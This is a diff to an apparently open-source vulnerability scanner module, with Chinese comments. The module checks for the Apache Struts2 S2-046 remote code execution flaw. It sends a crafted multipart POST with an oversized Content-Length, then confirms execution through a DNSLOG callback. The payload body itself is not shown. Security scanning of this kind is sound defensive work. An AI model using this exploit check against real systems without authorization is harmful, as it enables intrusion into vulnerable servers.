@@ -31,7 +31,7 @@ class UrlProcessing:  # URL处理函数
             res = urllib.parse.urlparse('http://%s' % url)
         return res.scheme, res.hostname, res.port,res.path
 
-def medusa(Url,RandomAgent,proxies=None,**kwargs):
+def medusa(Url:str,Headers:dict,proxies:str=None,**kwargs)->None:
     proxies=Proxies().result(proxies)
 
     scheme, url, port,path = UrlProcessing().result(Url)
@@ -52,25 +52,22 @@ x
 """
     try:
         payload_url = scheme + "://" + url +":"+ str(port)+path
-        headers = {
-            'User-Agent': RandomAgent,
-            "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
-            "Accept-Encoding": "gzip, deflate",
-            "Content-Length": "10000000",
-            "Content-Type":"multipart/form-data; boundary=---------------------------735323031399963166993862150"
-        }
+
+        Headers["Content-Length"]="10000000"
+        Headers["Content-Type"]="multipart/form-data; boundary=---------------------------735323031399963166993862150"
+
 
         try:#防止在linux系统上执行了POC，导致超时扫描不到漏洞
-            resp = requests.post(payload_url,headers=headers, data=data,timeout=6,proxies=proxies, verify=False)
+            resp = requests.post(payload_url,headers=Headers, data=data,timeout=6,proxies=proxies, verify=False)
             con = resp.text
-            print(con)
+
         except Exception as e:
-            print(e)
+            pass
+
 
         time.sleep(2)
         if DL.result():
             Medusa = "{} 存在Struts2远程代码执行漏洞(S2-046)\r\n漏洞详情:\r\n版本号:S2-046\r\n使用EXP:{}\r\n返回数据:{}\r\n返回DNSLOG数据:{}\r\n使用DNSLOG:{}\r\n".format(url,data,con,DL.dns_text(),DL.dns_host())
-            print(Medusa)
             _t=VulnerabilityInfo(Medusa)
             VulnerabilityDetails(_t.info, url,**kwargs).Write()  # 传入url和扫描到的数据
             WriteFile().result(str(url),str(Medusa))#写入文件，url为目标文件名统一传入，Medusa为结果
